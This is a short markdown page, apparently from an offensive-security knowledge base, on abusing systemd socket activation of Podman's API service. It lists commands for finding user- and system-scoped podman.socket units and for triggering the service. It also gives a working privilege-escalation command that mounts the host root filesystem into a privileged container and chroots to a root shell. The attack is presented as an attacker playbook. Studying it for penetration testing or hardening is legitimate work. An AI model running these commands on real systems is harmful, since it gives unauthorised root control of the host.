---
title: "systemd socket activation: on-demand Podman API exposure"
description: "Podman's API service is commonly started on demand through systemd socket activation: systemd owns the listening socket and launches Podman on the first connection. An attacker who can reach the activating socket, a user or system podman.socket unit, triggers the service and gains the same container-control API, with exposure depending on whether the socket is user or root scoped."
keywords:
  - systemd socket activation
  - podman.socket
  - podman api
  - on-demand service
  - container control
---

# systemd socket activation

Rather than run the Podman API service continuously, systems usually enable `podman.socket`, a systemd socket unit. systemd holds the listening socket and starts `podman system service` only when a client connects, then passes the accepted connection to it. For an attacker this is transparent: reaching the activating socket triggers the service and yields the Docker-compatible API. What matters is the socket's scope, a user `podman.socket` under `/run/user/<uid>/` or a system one under `/run/`, which decides whether the resulting service is rootless or rootful.

Locate the activating socket and its scope:

```bash
systemctl status podman.socket 2>/dev/null
systemctl --user status podman.socket 2>/dev/null
ls -l /run/podman/podman.sock /run/user/*/podman/podman.sock 2>/dev/null
# a connection activates the service; confirm by calling it
curl -s --unix-socket /run/podman/podman.sock http://d/version
```

## Triggering and using it

```bash
# the first request activates podman system service behind the socket
export DOCKER_HOST=unix:///run/podman/podman.sock
docker info                                           # service now running
# if system-scoped (rootful), proceed to host takeover
docker run -v /:/host --privileged --rm -it alpine chroot /host sh
```

## Exploitation notes

- Socket activation means the service may appear absent (no running process) yet be fully reachable; do not conclude the API is unavailable from the lack of a `podman system service` process, test the socket.
- Scope is everything: a system `podman.socket` activates a rootful service and is a host-takeover path; a user socket is bounded by the [rootless model](rootless-model.md).
- Reaching a user socket requires access as that user (or to their `/run/user/<uid>`), which a prior foothold as that user provides; the system socket is gated by its filesystem permissions.

## References

- [Podman: socket activation](https://docs.podman.io/en/latest/markdown/podman-systemd.unit.5.html)
- [systemd.socket](https://www.freedesktop.org/software/systemd/man/systemd.socket.html)
